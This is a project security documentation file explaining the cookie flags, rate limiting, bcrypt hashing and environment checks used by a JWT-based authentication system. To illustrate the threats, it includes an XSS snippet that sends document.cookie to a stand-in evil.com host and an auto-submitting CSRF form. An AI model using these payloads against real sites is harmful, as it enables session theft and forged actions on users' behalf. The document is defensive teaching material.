# Security Documentation

This document explains the security measures implemented in the authentication system, with a focus on cookie security flags and protection against common web vulnerabilities.

## Overview

The authentication system uses JWT tokens stored in **httpOnly cookies** with multiple security flags to protect against common attacks:

- **XSS (Cross-Site Scripting)**: httpOnly flag
- **MITM (Man-in-the-Middle)**: Secure flag (HTTPS only)
- **CSRF (Cross-Site Request Forgery)**: SameSite flag
- **Brute Force**: Rate limiting (5 attempts per 15 minutes)
- **Information Disclosure**: Generic error messages

## Cookie Security Flags

### httpOnly Flag

**Purpose**: Prevents JavaScript access to cookies, protecting against XSS attacks.

**How it works**:
- Cookie cannot be accessed via `document.cookie` in browser JavaScript
- Only accessible to the server (sent automatically with HTTP requests)
- Prevents malicious scripts from stealing authentication tokens

**Configuration** (frontend/lib/auth/better-auth.ts:37):
```typescript
cookie: {
  options: {
    httpOnly: true,  // XSS protection
  }
}
```

**Example Attack Scenario**:
```javascript
// Without httpOnly flag (VULNERABLE):
// Attacker injects script:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

// With httpOnly flag (PROTECTED):
// document.cookie returns empty string - token is safe
```

**Testing**:
1. Sign in to get authentication cookie
2. Open browser DevTools → Console
3. Run: `document.cookie`
4. Expected result: Cookie is NOT visible (httpOnly working)

### Secure Flag

**Purpose**: Ensures cookies are only sent over HTTPS, protecting against MITM attacks.

**How it works**:
- Cookie is only transmitted over encrypted (HTTPS) connections
- Prevents attackers from intercepting tokens on unsecured networks
- Automatically disabled in development (HTTP localhost)

**Configuration** (frontend/lib/auth/better-auth.ts:41):
```typescript
cookie: {
  options: {
    // Only use Secure flag in production (requires HTTPS)
    secure: env.NODE_ENV === "production",
  }
}
```

**Example Attack Scenario**:
```
Without Secure flag (VULNERABLE):
User connects to http://myapp.com on public WiFi
→ Attacker intercepts HTTP traffic
→ Attacker steals authentication cookie
→ Attacker impersonates user

With Secure flag (PROTECTED):
Cookie only sent over https://myapp.com
→ Traffic is encrypted (TLS/SSL)
→ Attacker cannot read cookie from encrypted traffic
```

**Environment Behavior**:
- **Development** (`NODE_ENV=development`): Secure flag is `false` (allows HTTP localhost)
- **Production** (`NODE_ENV=production`): Secure flag is `true` (requires HTTPS)

**Testing in Production**:
1. Deploy to HTTPS endpoint
2. Open browser DevTools → Application → Cookies
3. Verify cookie has "Secure" checkmark
4. Try accessing via HTTP → Cookie should NOT be sent

### SameSite Flag

**Purpose**: Prevents CSRF attacks by restricting when cookies are sent cross-site.

**How it works**:
- Controls whether cookies are sent with cross-site requests
- `SameSite=Lax` allows cookies on top-level navigation (clicking links)
- Blocks cookies on embedded requests (iframes, AJAX from other sites)

**Configuration** (frontend/lib/auth/better-auth.ts:45):
```typescript
cookie: {
  options: {
    sameSite: "lax",  // CSRF protection
  }
}
```

**SameSite Options Comparison**:

| Value | Top-level Navigation | Embedded Content | Use Case |
|-------|---------------------|------------------|----------|
| `Strict` | ✅ Sent | ❌ Not sent | Maximum security, but breaks some workflows |
| `Lax` | ✅ Sent | ❌ Not sent | **Recommended** - Good balance |
| `None` | ✅ Sent | ✅ Sent | Only for cross-site cookies (requires Secure) |

**Why Lax?**
- Allows users to click links from email, social media, etc. and stay authenticated
- Blocks CSRF attacks via forms, AJAX, iframes from malicious sites
- Best balance between security and usability

**Example Attack Scenario**:
```html
<!-- Without SameSite flag (VULNERABLE): -->
<!-- Attacker creates malicious page: -->
<form action="https://myapp.com/api/todos" method="POST">
  <input type="hidden" name="title" value="Hacked!" />
</form>
<script>document.forms[0].submit()</script>

<!-- User visits attacker's page while signed into myapp.com -->
<!-- Cookie is sent → Todo is created without user's knowledge -->

<!-- With SameSite=Lax (PROTECTED): -->
<!-- Cookie is NOT sent with cross-site form submission -->
<!-- Request fails (401 Unauthorized) - attack prevented -->
```

**Testing**:
1. Create a test page on a different domain (e.g., localhost:3001)
2. Try to make AJAX request to localhost:3000 with credentials
3. Expected result: Cookie is NOT sent (SameSite working)

### Max-Age

**Purpose**: Controls cookie expiration time.

**How it works**:
- Specifies how long (in seconds) the browser should keep the cookie
- After expiration, cookie is automatically deleted
- Set to 7 days (604800 seconds) to match JWT expiration

**Configuration** (frontend/lib/auth/better-auth.ts:49):
```typescript
cookie: {
  options: {
    maxAge: 60 * 60 * 24 * 7,  // 7 days in seconds
  }
}
```

**Security Benefits**:
- Limits window of opportunity if token is compromised
- Forces re-authentication after 7 days
- Aligns cookie lifetime with JWT expiration

### Path

**Purpose**: Restricts which routes can access the cookie.

**How it works**:
- Cookie is only sent for URLs matching the specified path
- Set to `/` to allow all routes in the application

**Configuration** (frontend/lib/auth/better-auth.ts:52):
```typescript
cookie: {
  options: {
    path: "/",  // Available for all routes
  }
}
```

## Additional Security Measures

### Rate Limiting

**Purpose**: Prevents brute force password guessing attacks.

**Implementation** (frontend/lib/auth/rate-limit.ts):
- Tracks failed login attempts per email address
- Limits to 5 attempts per 15-minute window
- Returns 429 Too Many Requests after limit exceeded

**Configuration**:
```typescript
export function checkRateLimit(
  email: string,
  maxAttempts: number = 5,
  windowMs: number = 15 * 60 * 1000  // 15 minutes
): boolean
```

**Example**:
```
Attempt 1-5: Login allowed (may fail if wrong password)
Attempt 6+:  429 Too Many Requests - must wait 15 minutes
After 15 min: Counter resets, attempts allowed again
```

### Generic Error Messages

**Purpose**: Prevents user enumeration attacks.

**Implementation** (frontend/app/api/auth/signin/route.ts:35):
- Never reveal whether email exists in database
- Return same error for "user not found" and "wrong password"
- Generic message: "Invalid email or password"

**Why?**
```
// INSECURE (reveals if email exists):
User exists but wrong password → "Invalid password"
User doesn't exist → "Email not found"

// SECURE (doesn't reveal existence):
User exists but wrong password → "Invalid email or password"
User doesn't exist → "Invalid email or password"
```

This prevents attackers from discovering valid email addresses in the system.

### Password Hashing

**Purpose**: Protects passwords even if database is compromised.

**Implementation**:
- Uses bcrypt with cost factor 12
- Cost factor balances security vs performance
- Each password has unique salt (automatic with bcrypt)

**Configuration** (research.md - Decision 4):
```typescript
const passwordHash = await bcrypt.hash(password, 12);
```

**Cost Factor Explanation**:
- Cost 10: ~100ms to hash (fast, less secure)
- Cost 12: ~300ms to hash (recommended balance)
- Cost 14: ~1200ms to hash (very secure, slower)

Higher cost makes brute force attacks computationally expensive.

### Environment Variable Validation

**Purpose**: Ensures required secrets are configured correctly.

**Implementation** (frontend/lib/env.ts):
```typescript
const envSchema = z.object({
  BETTER_AUTH_SECRET: z.string().min(32, "Must be at least 32 characters"),
  NODE_ENV: z.enum(["development", "production", "test"]),
});

export const env = envSchema.parse(process.env);
```

**Validation Rules**:
- BETTER_AUTH_SECRET must be at least 32 characters
- NODE_ENV must be one of: development, production, test
- Fails fast at startup if validation fails

## Security Best Practices Checklist

### Development
- [x] Use httpOnly cookies for JWT tokens
- [x] Enable Secure flag in production (HTTPS)
- [x] Set SameSite=Lax to prevent CSRF
- [x] Implement rate limiting on authentication endpoints
- [x] Use generic error messages (no user enumeration)
- [x] Hash passwords with bcrypt (cost factor 12)
- [x] Validate environment variables at startup
- [x] Set appropriate cookie expiration (7 days)

### Deployment
- [ ] Ensure HTTPS is enabled (required for Secure flag)
- [ ] Use strong, randomly generated BETTER_AUTH_SECRET (64+ characters)
- [ ] Keep secrets in environment variables (never commit to git)
- [ ] Share same secret between frontend and backend
- [ ] Monitor authentication logs for suspicious activity
- [ ] Set up alerts for rate limit violations
- [ ] Review CORS configuration if frontend/backend on different domains

### Monitoring
- [ ] Log all authentication events (signup, signin, failures)
- [ ] Monitor rate limit violations (potential attacks)
- [ ] Track failed login attempts per user
- [ ] Alert on unusual patterns (many failures from same IP)
- [ ] Regular security audits of authentication flow

## Common Vulnerabilities Prevented

| Vulnerability | Protection | Implementation |
|---------------|------------|----------------|
| XSS (Cross-Site Scripting) | httpOnly flag | Cookies not accessible to JavaScript |
| MITM (Man-in-the-Middle) | Secure flag | Cookies only sent over HTTPS |
| CSRF (Cross-Site Request Forgery) | SameSite=Lax | Cookies blocked on cross-site requests |
| Brute Force | Rate limiting | 5 attempts per 15 minutes |
| User Enumeration | Generic errors | Same error for all auth failures |
| Password Cracking | bcrypt hashing | Computationally expensive to crack |
| Weak Secrets | Environment validation | Enforces 32+ character secrets |
| Session Hijacking | 7-day expiration | Limited window for stolen tokens |

## Testing Security Measures

### Test httpOnly Flag
```javascript
// In browser console after signing in:
console.log(document.cookie);
// Expected: Cookie should NOT be visible
```

### Test Secure Flag (Production)
```bash
# Try to access app over HTTP (should not work)
curl -v http://myapp.com/api/todos
# Cookie should not be sent

# Access over HTTPS (should work)
curl -v https://myapp.com/api/todos
# Cookie should be sent
```

### Test Rate Limiting
```bash
# Try 6 failed login attempts
for i in {1..6}; do
  curl -X POST http://localhost:3000/api/auth/signin \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","password":"wrong"}'
done
# 6th attempt should return 429 Too Many Requests
```

### Test SameSite
1. Sign in to app on localhost:3000
2. Create test page on localhost:3001
3. Try to make AJAX request to localhost:3000 API
4. Expected: Cookie not sent (SameSite blocking cross-origin)

## References

- [OWASP Cheat Sheet: Cross-Site Scripting](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Cheat Sheet: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN Web Docs: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)
- [bcrypt: Choosing a Work Factor](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
